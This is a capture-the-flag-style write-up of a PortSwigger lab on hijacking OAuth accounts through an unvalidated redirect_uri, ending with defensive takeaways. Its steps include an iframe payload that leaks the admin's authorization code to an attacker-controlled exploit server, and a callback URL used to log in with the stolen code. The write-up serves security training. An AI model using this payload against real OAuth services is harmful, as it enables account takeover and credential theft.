# OAuth Account Hijacking via redirect_uri

## 📌 Lab Details
- **Title**: OAuth Account Hijacking via redirect_uri
- **Difficulty**: Practitioner
- **Category**: OAuth Authentication
- **Lab URL**: https://portswigger.net/academy/labs/launch/8df8965d53d202be54b51a34cae42dca0806945f7ef11146e8a1905bf9f71f6b?referrer=%2fweb-security%2foauth%2flab-oauth-account-hijacking-via-redirect-uri

## 🔍 Summary
This lab demonstrates an OAuth implementation flaw where the authorization server fails to properly validate the `redirect_uri` parameter. <br>
As a result, an attacker can replicate the legitimate callback URL with a domain they controal and recieve authorization codes intended for other users. <br>
Since the administrator is already authenticated with the OAuth provider and will visit any supplied exploit, the attacker can force the administrator's browser to request a new authorization code and leak it to the exploit server. <br>
The stolen authorization code can then be used to complete the OAuth login flow and gain access to the administrator account.

## 🛠 Steps to Solve
1. While proxying traffic through Burp, click "My account" and complete the OAuth login process. Afterwards, you will be redirected back to the blog website.
2. Log out and then log back in again. Observe that you are logged in instantly this time. As you still had an active session with the OAuth service, you didn't need to enter your credentials again to authenticate yourself.
3. n Burp, study the OAuth flow in the proxy history and identify the most recent authorization request. This should start with `GET /auth?client_id=[...]`. Notice that when this request is sent, you are immediately redirected to the `redirect_uri` along with the authorization code in the query string. Send this authorization request to Burp Repeater.
4. In Burp Repeater, observe that you can submit any arbitrary value as the `redirect_uri` without encountering an error. Notice that your input is used to generate the redirect in the response.
5. Change the `redirect_uri` to point to the exploit server, then send the request and follow the redirect. Go to the exploit server's access log and observe that there is a log entry containing an authorization code. This confirms that you can leak authorization codes to an external domain.
6. Go back to the exploit server and create the following `iframe` at `/exploit`:
   ```sh
   <iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
   ```
7. Deliver the exploit to the victim, then go back to the access log and copy the victim's code from the resulting request.
8. Log out of the blog website and then use the stolen code to navigate to:
   ```sh
   https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE
   ```
   The rest of the OAuth flow will be completed automatically and you will be logged in as the admin user. Open the admin panel and delete `carlos` to solve the lab.

## 📖 Key Takeaways
- OAuth providers must strictly validate registered `redirect_uri` values.
- Authorization codes should only be sent to pre-approved callback URLs.
- Authorization codes act as temporary credentials and can be exchanged for access tokens.
- Active OAuth sessions increase the impact because users can be silently re-authorized without re-entering credentials.

## 🖼️ Screenshot 
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/7f27ba61-6bea-49a7-ae87-b1919ac82ffa" />
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/874965ed-ccaf-48df-bb9f-da512e4d1c54" />
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/210f2a3c-f520-4695-b72b-f59008e84f3d" />
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/6695e1be-6750-4ff3-b0eb-94e14237886e" />
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/bf0ab3f2-deca-48ed-8524-d5dbc63b9c15" />
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/e9bdffef-4f9e-4f1e-b2e5-a752bc7ee918" />
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/e1d3124f-f50c-4cbb-b4a5-ab2e5e1c43da" />
